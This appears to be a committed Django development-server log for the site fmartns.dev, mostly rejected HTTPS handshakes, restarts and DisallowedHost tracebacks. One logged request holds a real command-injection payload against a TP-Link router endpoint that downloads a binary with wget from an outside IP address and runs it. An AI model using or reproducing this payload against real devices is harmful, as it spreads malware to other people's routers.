+[18/Apr/2024 21:54:17] code 400, message Bad request version ('¾i')
+[18/Apr/2024 21:54:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:54:20] code 400, message Bad request version ('zz\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93::\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00ÿ\x01\x00\x01\x00\x00#\x00\x00\x00')
+[18/Apr/2024 21:54:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:54:20] code 400, message Bad request version ('\x9a\x9a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93\x9a\x9a\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00')
+[18/Apr/2024 21:54:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:54:21] code 400, message Bad request version ('JÊ»^àPÀ¢')
+[18/Apr/2024 21:54:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:54:21] code 400, message Bad request version ('\x02h2\x08http/1.1\x00\x12\x00\x00\x00')
+[18/Apr/2024 21:54:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 21:47:52
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 21:56:03] code 400, message Bad request syntax ('\x16\x03\x01\x02:\x01\x00\x026\x03\x03ð^µÕ]\x9cù')
+[18/Apr/2024 21:56:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:03] code 400, message Bad request version ('Ø!=\x00\x05\x00\x05\x01\x00\x00\x00\x00Di\x00\x05\x00\x03\x02h2\x00\x1b\x00\x03\x02\x00\x02\x00+\x00\x07\x06ªª\x03\x04\x03\x03\x00')
+[18/Apr/2024 21:56:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:04] code 400, message Bad request version ('ÚÚ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\xad')
+[18/Apr/2024 21:56:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:04] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03i')
+[18/Apr/2024 21:56:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:06] code 400, message Bad request syntax ('\x16\x03\x01\x02\x1a\x01\x00\x02\x16\x03\x03rRØî3\x8bÒv')
+[18/Apr/2024 21:56:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:06] code 400, message Bad request version ('ªª\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93\x8a\x8a\x00\x00\x00')
+[18/Apr/2024 21:56:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:06] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01ÿ\x01\x00\x01\x00\x00\x17\x00\x00\x00')
+[18/Apr/2024 21:56:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:06] code 400, message Bad request version ('\x00\x02\x01\x00\x00+\x00\x07\x06úú\x03\x04\x03\x03\x00\x12\x00\x00\x00')
+[18/Apr/2024 21:56:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:13] code 400, message Bad request version ('ËèðUN¨:uÒS\x1bÃWè¨é«\x06\x1a\x17ì°gÙ=\x0eDÈC.zRÜO»_VP\x8dÆÏ)à\x80~L\x1bê(\x17ò!C¦N\x18\x05\x07--s_')
+[18/Apr/2024 21:56:13] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:13] code 400, message Bad request version ('¤!g')
+[18/Apr/2024 21:56:13] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:13] code 400, message Bad request version ('À4fT/sÐÍÖbÏ\x90O\x8cY·b\x95\x7f\x0fN*\x96iðd´ó')
+[18/Apr/2024 21:56:13] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:13] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00\x05\x00\x05\x01\x00\x00\x00\x00ÿ\x01\x00\x01\x00\x00+\x00\x07\x06ÊÊ\x03\x04\x03\x03\x00\x1b\x00\x03\x02\x00\x02\x00-\x00\x02\x01\x01\x00')
+[18/Apr/2024 21:56:13] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:14] code 400, message Bad request version ('\x02h2\x08http/1.1\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00')
+[18/Apr/2024 21:56:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:14] code 400, message Bad request version ('[>ö%ô±]ÜÝSú\x9c;ý\x8b9\x16LP\x17&l¢O\x00úÓ£\x95Q,Skøð*É\x10d')
+[18/Apr/2024 21:56:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:14] code 400, message Bad request version ('RÉÄ.\x8fa¢\x13:!X9=:\x05\x08\x15!@\x7f\x08¯ä-jPý\x86&\x03Õ\x00\x00\x90)¡3L\xad\x19ðV\x8e\x8cí\x8fC;z&Ô\x1bêXW%ú~ÖâÞ\x86¾©\x0e©\\r+\x053\x8d(ÆkYôñEöù±K·Ðy@!¢é¦à9\x01®x"')
+[18/Apr/2024 21:56:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:56:14] code 400, message Bad request version ('_K\x86\x01q{\\¤ñ\x056««Y\x9e7\x91D{d·ìÉR¸Púö¶ï*\x06\x00')
+[18/Apr/2024 21:56:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:54] code 400, message Bad request version ("CÏÍ¥\x8b'Q\x8e¨ãæ.4ø!~(È½6«\x8bL\x8flDAü0®\x8aä\x00")
+[18/Apr/2024 21:57:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:54] code 400, message Bad request version ('\x06\x16;+ÿÐ]H=*¿\x03]c')
+[18/Apr/2024 21:57:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:54] code 400, message Bad request version ('ìx\x8c¶¢\x80»\x1b¸«H~+\x84â$¯ë\x87`ÜX3àtÖ?\x99uyÌ+\x00+\x00\x07\x06**\x03\x04\x03\x03\x00')
+[18/Apr/2024 21:57:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:54] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ÞÁ')
+[18/Apr/2024 21:57:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:57] code 400, message Bad request syntax ('\x16\x03\x01\x02\x1a\x01\x00\x02\x16\x03\x03o²úX\x9e\x04à´8Ñ\x065\x16ß¹îÜ«Ôôt\x809<Ö')
+[18/Apr/2024 21:57:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:57] code 400, message Bad request version ('\x11\x16¬ÇËXãe\x19ø1êô')
+[18/Apr/2024 21:57:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:57] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x1c')
+[18/Apr/2024 21:57:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:57:57] code 400, message Bad request version ('03}ø\x00#\x00\x00\x00\x17\x00\x00\x00')
+[18/Apr/2024 21:57:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 21:57:51
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 21:59:01] code 400, message Bad request version ('\x00º\x00\x00\x01\x00\x01')
+[18/Apr/2024 21:59:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:01] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00')
+[18/Apr/2024 21:59:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:01] code 400, message Bad request version ('\x9e5¶\x18¡`\\8ä\x81\x84(É\x19åÌª÷]\x18Ù¿\x97)\x9c§ÃpDEvy\x00#\x00\x00\x00')
+[18/Apr/2024 21:59:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:01] code 400, message Bad request version ('\x138$´»wÑ!W]\x87æ\x8fÜæ@Øë\x9a\x97\x84÷\x9f²7_\x0f·ávF')
+[18/Apr/2024 21:59:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:03] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00+\x00\x07\x06\x9a\x9a\x03\x04\x03\x03\x00')
+[18/Apr/2024 21:59:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:03] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00')
+[18/Apr/2024 21:59:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:04] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x1a\x01\x00\x02\x16\x03\x03\x9dþ\x9bÆ:Mxüt¡´|\x976¾\x00pö>5\x00öëú\x81\x0e¯=\x1aÙ\x04ß')
+[18/Apr/2024 21:59:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:04] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x1a\x01\x00\x02\x16\x03\x0358')
+[18/Apr/2024 21:59:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:06] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:59:10] code 400, message Bad request version ('fmartns.dev\x00\x05\x00\x05\x01\x00\x00\x00\x00ÿ\x01\x00\x01\x00\x00')
+[18/Apr/2024 21:59:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:11] code 400, message Bad request version ('ZZ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01Á')
+[18/Apr/2024 21:59:11] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:11] code 400, message Bad request syntax ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03¹bÝÖd:[Y©PùB\x83E\x97fÚäÑIZýGNW9\x9b\x80')
+[18/Apr/2024 21:59:11] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:11] code 400, message Bad request version ('úú\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01á**\x00\x00\x00')
+[18/Apr/2024 21:59:11] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:11] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:59:11] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:11] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:59:11] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request version ('vÂé»²g\x91ðÿ[Z©7\x7fÉW§2m\x00')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request version ('Ü\x95\x88À')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03î¯')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request version ('\x1aA\x05àÖhÆ»¡ÆÌ\x10ìñ¦\x96øÓó\x00')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request version ('w¯Ë\x00xS\x19nÙLY\x9a7\x00#\x00\x00\x00-\x00\x02\x01\x01ÿ\x01\x00\x01\x00\x00')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:14] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:59:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:16] code 400, message Bad request version ('T?\x80üaz5¤z*\x83\x02³dß\x8aÜ')
+[18/Apr/2024 21:59:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:16] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:59:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:16] code 400, message Bad request version ('@:\x90÷\x00')
+[18/Apr/2024 21:59:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:16] code 400, message Bad request version ('oï\x8d\\7ÅÜ\x12')
+[18/Apr/2024 21:59:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:17] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x003\x00+\x00)')
+[18/Apr/2024 21:59:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:17] code 400, message Bad request version ('õ\x00')
+[18/Apr/2024 21:59:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03\x1b\x81')
+[18/Apr/2024 21:59:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:18] code 400, message Bad request version ('9ËÔ3Þ¦\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00')
+[18/Apr/2024 21:59:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 21:58:59
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 21:59:42] code 400, message Bad request version ('ðË')
+[18/Apr/2024 21:59:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:42] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Ðxr°')
+[18/Apr/2024 21:59:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:42] code 400, message Bad request version ('\x8a\x8a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93ZZ\x00\x00\x00-\x00\x02\x01\x01\x00#\x00\x00\x00')
+[18/Apr/2024 21:59:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:42] code 400, message Bad request version ('\x00º\x00\x00\x01\x00\x01¶\x00')
+[18/Apr/2024 21:59:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:43] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:59:43] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:43] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00')
+[18/Apr/2024 21:59:43] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:44] code 400, message Bad request version ('fmartns.dev\x00')
+[18/Apr/2024 21:59:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:44] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03')
+[18/Apr/2024 21:59:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:44] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ñÓ-')
+[18/Apr/2024 21:59:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:59:44] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x92\x03\x02\x90')
+[18/Apr/2024 21:59:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 21:59:40
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+Watching for file changes with StatReloader
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[19/Apr/2024 11:43:59] "GET / HTTP/1.0" 400 61627
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/security.py", line 28, in process_request
+    host = self.redirect_host or request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[19/Apr/2024 11:52:03] "GET / HTTP/1.0" 400 59636
+Invalid HTTP_HOST header: '3.82.145.23:80,3.82.145.23'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/security.py", line 28, in process_request
+    host = self.redirect_host or request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '3.82.145.23:80,3.82.145.23'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /cgi-bin/luci/;stok=/locale
+[19/Apr/2024 12:05:15] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.0" 400 61333
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[19/Apr/2024 12:45:12] "GET / HTTP/1.0" 400 61497
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /robots.txt
+[19/Apr/2024 12:45:26] "GET /robots.txt HTTP/1.0" 400 60574
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /robots.txt
+[19/Apr/2024 12:59:32] "GET /robots.txt HTTP/1.0" 400 60574
+Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Traceback (most recent call last):
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/fmartns.dev/venv/lib/python3.8/site-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'fmartns.dev,fmartns.dev'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[19/Apr/2024 12:59:33] "GET / HTTP/1.0" 400 61627
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 19, 2024 - 11:43:55
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
